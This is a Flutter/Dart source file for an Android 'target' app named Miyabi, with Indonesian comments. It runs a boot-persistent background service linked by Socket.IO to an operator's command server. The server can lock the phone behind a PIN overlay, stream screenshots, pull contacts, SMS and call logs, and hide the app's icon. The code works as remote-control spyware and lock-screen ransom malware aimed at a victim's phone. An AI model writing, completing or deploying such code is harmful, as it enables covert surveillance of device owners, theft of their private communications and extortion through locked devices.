import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:socket_io_client/socket_io_client.dart' as io;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

const SERVER_URL = 'http://192.168.1.8:3000'; // ⚠️ GANTI IP SERVER KAMU
const NOTIF_CHANNEL_ID = 'miyabi_service';
const NOTIF_CHANNEL_NAME = 'Miyabi Service';

// ═══════════════════════════════════════════════════════════════════════════
//   MAIN
// ═══════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _initNotifications();
  await _initBackgroundService();
  runApp(const TargetApp());
}

Future<void> _initNotifications() async {
  final plugin = FlutterLocalNotificationsPlugin();
  const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
  const settings = InitializationSettings(android: androidInit);
  await plugin.initialize(settings);

  // Request permission Android 13+
  await plugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.requestNotificationsPermission();
}

Future<void> _initBackgroundService() async {
  final service = FlutterBackgroundService();

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onServiceStart,
      autoStart: true,               // ✅ auto-start saat app dibuka
      isForegroundMode: true,
      notificationChannelId: NOTIF_CHANNEL_ID,
      initialNotificationTitle: 'Miyabi Active',
      initialNotificationContent: 'Menunggu perintah...',
      foregroundServiceNotificationId: 8888,
      foregroundServiceTypes: [AndroidForegroundType.specialUse],
      autoStartOnBoot: true,          // ✅ auto-start saat HP reboot
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onServiceStart,
      onBackground: onIosBackground,
    ),
  );

  service.startService();
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  return true;
}

// ═══════════════════════════════════════════════════════════════════════════
//   BACKGROUND SERVICE — SOCKET.IO 24/7
// ═══════════════════════════════════════════════════════════════════════════
@pragma('vm:entry-point')
void onServiceStart(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();

  final _native = MethodChannel('miyabi/native');

  // ─── Setup Android foreground mode ───────────────────────────────────────
  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((_) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((_) {
      service.setAsBackgroundService();
    });
    service.setAsForegroundService();
  }

  // ─── Load device info ────────────────────────────────────────────────────
  final prefs = await SharedPreferences.getInstance();
  String deviceId = prefs.getString('device_id') ?? '';
  String deviceName = prefs.getString('device_name') ?? 'Unknown';

  if (deviceId.isEmpty) {
    try {
      deviceId = await _native.invokeMethod('getTargetId') ?? 'DEV-UNK';
      final info = await DeviceInfoPlugin().androidInfo;
      deviceName = '${info.brand} ${info.model}';
      await prefs.setString('device_id', deviceId);
      await prefs.setString('device_name', deviceName);
    } catch (_) {
      deviceId = 'DEV-UNK-${DateTime.now().millisecondsSinceEpoch}';
    }
  }

  // ─── Connect Socket.IO ───────────────────────────────────────────────────
  io.Socket? socket;
  Timer? screenTimer;
  Timer? heartbeatTimer;
  bool streaming = false;

  void connectSocket() {
    socket = io.io(SERVER_URL, io.OptionBuilder()
      .setTransports(['websocket'])
      .enableReconnection()
      .setReconnectionAttempts(999999)
      .setReconnectionDelay(3000)
      .disableAutoConnect()
      .build());

    socket!.onConnect((_) {
      print('[BG] Socket connected');
      _updateNotif(service, 'Online — $deviceName');

      socket!.emit('register_target', {
        'deviceId': deviceId,
        'model': deviceName,
        'brand': deviceName.split(' ').first,
        'android': Platform.operatingSystemVersion,
      });

      // Heartbeat tiap 20 detik
      heartbeatTimer?.cancel();
      heartbeatTimer = Timer.periodic(const Duration(seconds: 20), (_) {
        socket?.emit('register_target', {
          'deviceId': deviceId,
          'model': deviceName,
          'brand': deviceName.split(' ').first,
          'android': Platform.operatingSystemVersion,
        });
      });
    });

    socket!.onDisconnect((_) {
      print('[BG] Socket disconnected');
      _updateNotif(service, 'Reconnecting...');
      // Auto reconnect
      Future.delayed(const Duration(seconds: 3), () {
        if (socket?.connected != true) {
          socket?.connect();
        }
      });
    });

    socket!.onConnectError((e) {
      print('[BG] Connect error: $e');
      Future.delayed(const Duration(seconds: 5), () {
        if (socket?.connected != true) socket?.connect();
      });
    });

    socket!.onError((e) {
      print('[BG] Socket error: $e');
    });

    // ─── Terima pairing ──────────────────────────────────────────────────
    socket!.on('paired', (data) {
      _updateNotif(service, 'Paired: ${data['adminUsername']}');
    });

    // ─── Terima command ──────────────────────────────────────────────────
    socket!.on('command', (data) async {
      final action = data['action'];
      final payload = data['payload'] ?? {};
      final cmdId = data['id'];

      try {
        await _executeCommand(_native, action, payload);
        socket!.emit('target_response', {
          'deviceId': deviceId,
          'type': 'command_ack',
          'data': {'id': cmdId, 'action': action, 'success': true},
        });
      } catch (e) {
        socket!.emit('target_response', {
          'deviceId': deviceId,
          'type': 'command_ack',
          'data': {
            'id': cmdId,
            'action': action,
            'success': false,
            'error': '$e'
          },
        });
      }
    });

    // ─── Screen streaming ────────────────────────────────────────────────
    socket!.on('start_screen_stream', (_) {
      streaming = true;
      screenTimer?.cancel();
      screenTimer = Timer.periodic(const Duration(milliseconds: 1500), (_) async {
        if (!streaming) return;
        try {
          final bytes = await _native.invokeMethod<Uint8List>('captureScreen');
          if (bytes == null) return;
          socket!.emit('screen_frame', {
            'deviceId': deviceId,
            'frame': base64Encode(bytes),
          });
        } catch (_) {}
      });
    });

    socket!.on('stop_screen_stream', (_) {
      streaming = false;
      screenTimer?.cancel();
    });

    socket!.on('force_disconnect', (_) {
      socket?.disconnect();
    });

    socket!.connect();
  }

  connectSocket();

  // ─── Listen command from UI (foreground) ────────────────────────────────
  service.on('stopService').listen((event) {
    heartbeatTimer?.cancel();
    screenTimer?.cancel();
    socket?.dispose();
    service.stopSelf();
  });

  // ─── Keep alive every 30s ───────────────────────────────────────────────
  Timer.periodic(const Duration(seconds: 30), (t) async {
    if (service is AndroidServiceInstance) {
      if (await service.isForegroundService()) {
        service.setForegroundNotificationInfo(
          title: 'Miyabi Active',
          content: socket?.connected == true ? 'Online' : 'Reconnecting...',
        );
      }
    }
    // Kalau socket mati, reconnect
    if (socket?.connected != true) {
      socket?.connect();
    }
  });
}

// ─── Update notifikasi ─────────────────────────────────────────────────────
Future<void> _updateNotif(ServiceInstance service, String text) async {
  if (service is AndroidServiceInstance) {
    service.setForegroundNotificationInfo(
      title: 'Miyabi Active',
      content: text,
    );
  }
}

// ─── Eksekusi command dari server ──────────────────────────────────────────
Future<void> _executeCommand(
  MethodChannel native,
  String action,
  Map payload,
) async {
  switch (action) {
    case 'lock':
      await native.invokeMethod('showLockOverlay', {
        'pin': payload['pin']?.toString() ?? '123',
        'message': payload['message']?.toString() ?? 'Perangkat dikunci.',
        'targetId': payload['targetId']?.toString() ?? '',
      });
      break;
    case 'unlock':
      await native.invokeMethod('hideLockOverlay');
      break;
    case 'flashlight_on':
      await native.invokeMethod('setFlashlight', {'on': true});
      break;
    case 'flashlight_off':
      await native.invokeMethod('setFlashlight', {'on': false});
      break;
    case 'play_sound':
      await native.invokeMethod('playMedia', {
        'url': payload['url'] ?? '',
        'type': 'audio',
      });
      break;
    case 'play_video':
      await native.invokeMethod('playMedia', {
        'url': payload['url'] ?? '',
        'type': 'video',
      });
      break;
    case 'stop_video':
      await native.invokeMethod('stopMedia');
      break;
    case 'wallpaper':
      await native.invokeMethod('setWallpaper', {'url': payload['url'] ?? ''});
      break;
    case 'contacts':
      final contacts = await native.invokeMethod('getContacts');
      // Socket emit dari sini
      break;
    case 'sms_log':
      await native.invokeMethod('getSmsLog');
      break;
    case 'call_log':
      await native.invokeMethod('getCallLog');
      break;
    case 'hide_app':
      await native.invokeMethod('setAppHidden', {'hidden': true});
      break;
    case 'show_app':
      await native.invokeMethod('setAppHidden', {'hidden': false});
      break;
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//   UI
// ═══════════════════════════════════════════════════════════════════════════
class TargetApp extends StatelessWidget {
  const TargetApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF000000),
        colorScheme: const ColorScheme.dark(primary: Colors.white),
      ),
      home: const TargetHome(),
    );
  }
}

class TargetHome extends StatefulWidget {
  const TargetHome({super.key});
  @override
  State<TargetHome> createState() => _TargetHomeState();
}

class _TargetHomeState extends State<TargetHome> {
  static const _native = MethodChannel('miyabi/native');
  String _deviceId = '';
  String _deviceName = '';
  bool _serviceRunning = false;

  @override
  void initState() {
    super.initState();
    _loadInfo();
    _checkService();
    _requestPermissions();
  }

  Future<void> _loadInfo() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _deviceId = prefs.getString('device_id') ?? '';
      _deviceName = prefs.getString('device_name') ?? '';
    });
    if (_deviceId.isEmpty) {
      try {
        final id = await _native.invokeMethod<String>('getTargetId') ?? '';
        final info = await DeviceInfoPlugin().androidInfo;
        final name = '${info.brand} ${info.model}';
        await prefs.setString('device_id', id);
        await prefs.setString('device_name', name);
        setState(() {
          _deviceId = id;
          _deviceName = name;
        });
      } catch (_) {}
    }
  }

  Future<void> _checkService() async {
    final service = FlutterBackgroundService();
    final running = await service.isRunning();
    setState(() => _serviceRunning = running);
  }

  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.notification,
      Permission.contacts,
      Permission.sms,
      Permission.phone,
      Permission.storage,
    ].request();
    try {
      await _native.invokeMethod('requestOverlayPermission');
      await _native.invokeMethod('requestIgnoreBatteryOptimization');
    } catch (_) {}
  }

  Future<void> _toggleService() async {
    final service = FlutterBackgroundService();
    if (_serviceRunning) {
      service.invoke('stopService');
      await Future.delayed(const Duration(milliseconds: 500));
      setState(() => _serviceRunning = false);
    } else {
      await service.startService();
      setState(() => _serviceRunning = true);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF000000),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(24),
          child: Column(
            children: [
              const SizedBox(height: 30),
              Container(
                width: 100, height: 100,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _serviceRunning
                        ? const Color(0xFF22C55E)
                        : const Color(0xFFEF4444),
                    width: 3,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: (_serviceRunning
                              ? const Color(0xFF22C55E)
                              : const Color(0xFFEF4444))
                          .withOpacity(0.4),
                      blurRadius: 25,
                    ),
                  ],
                ),
                child: const Icon(Icons.smartphone, color: Colors.white, size: 45),
              ),
              const SizedBox(height: 20),
              Text(
                _serviceRunning ? 'ONLINE 24/7' : 'OFFLINE',
                style: TextStyle(
                  color: _serviceRunning
                      ? const Color(0xFF22C55E)
                      : const Color(0xFFEF4444),
                  fontSize: 18,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 3,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                _serviceRunning
                    ? 'Berjalan di background'
                    : 'Tekan tombol di bawah untuk mulai',
                style: const TextStyle(color: Colors.white54, fontSize: 11),
              ),
              const SizedBox(height: 30),
              _infoCard('Device ID', _deviceId),
              const SizedBox(height: 10),
              _infoCard('Nama Device', _deviceName),
              const SizedBox(height: 30),
              SizedBox(
                width: double.infinity,
                height: 55,
                child: ElevatedButton(
                  onPressed: _toggleService,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: _serviceRunning ? Colors.red : Colors.white,
                    foregroundColor: _serviceRunning ? Colors.white : Colors.black,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(14),
                    ),
                  ),
                  child: Text(
                    _serviceRunning ? 'STOP SERVICE' : 'MULAI SERVICE 24/7',
                    style: const TextStyle(
                      fontSize: 13,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 2,
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 20),
              const Text(
                'Kirim Device ID di atas ke admin',
                style: TextStyle(color: Colors.white38, fontSize: 11),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _infoCard(String label, String value) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: const Color(0xFF111111),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFF2A2A2A)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label,
              style: const TextStyle(
                  color: Color(0xFF6B6B6B),
                  fontSize: 10,
                  letterSpacing: 1.2,
                  fontWeight: FontWeight.w800)),
          const SizedBox(height: 6),
          SelectableText(
            value.isEmpty ? '...' : value,
            style: const TextStyle(
                color: Colors.white,
                fontSize: 14,
                fontWeight: FontWeight.w800,
                fontFamily: 'monospace'),
          ),
        ],
      ),
    );
  }
}